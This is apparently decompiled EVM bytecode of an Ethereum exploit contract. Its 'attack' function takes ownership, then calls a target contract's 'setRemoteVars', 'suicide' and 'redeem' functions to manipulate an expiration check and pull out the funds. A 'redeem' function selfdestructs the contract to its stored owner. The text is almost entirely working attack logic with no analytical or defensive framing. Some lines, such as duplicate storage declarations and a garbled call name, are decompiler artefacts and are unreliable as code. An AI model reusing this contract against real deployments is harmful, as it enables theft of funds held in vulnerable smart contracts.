contract main {


// =======================  Init code  ======================


address stor1;
address stor2;
uint256 stor3;
uint256 stor4;

function _fallback() payable {
    stor1 = 0xb0f94af0cfccc76113bb5ba2c2d89d56221b18a5
    stor2 = 0x97fcd8f3a75540d876246b2b94c476b3fa7105c5
    stor3 = 5000 * 10^18
    stor4 = block.timestamp - (504 * 24 * 3600)
    return code.data[114 len 645]
}



// =====================  Runtime code  =====================


address stor0;
uint256 stor0;
address stor1;
uint256 stor1;
uint256 stor3;
uint256 expiration;

function expiration() payable {
    return expiration
}

function redeem() payable {
    selfdestruct(address(stor0))
}

function _fallback() payable {
  stop
}

function sub_799dae06(?) payable {
    expiration = 0
}

function transfer(address arg1, uint256 arg2) payable {
    call arg1 with:
       value arg2 wei
         gas 95000 wei
    if not ext_call.success:
        return 0
    return 1
}

function attack(address arg1, uint256 arg2) payable {
    uint256(stor0) = msg.sender or Mask(96, 160, uint256(stor0))
    uint256(stor1) = arg1 or Mask(96, 160, uint256(stor1))
    stor3 = arg2
    expiration = block.timestamp - (504 * 24 * 3600)
    call arg1 with:
       funct Mask(32, 224, 'setRemoteVars') >> 224
         gas gas_remaining - 25050 wei
        args Mask(224, 0, 'setRemoteVars')
    call address(stor1) with:
       funct Mask(32, 224, 'suicide') >> 224
         gas gas_remaining - 25050 wei
        args Mask(224, 0, 'suicide'), 0x97fcd8f3a75540d876246b2b94c476b3fa7105c5
    call address(stor1) with:
       funct Mask(32, 224, 'redeem') >> 224
         gas gas_remaining - 25050 wei
        args Mask(224, 0, 'redeem')
    call address(stor1).'Fe	m' with:
         gas gas_remaining - 25050 wei
    require ext_call.success
    if block.timestamp <= ext_call.return_data[0]:
        return 0
    return 1
}



}
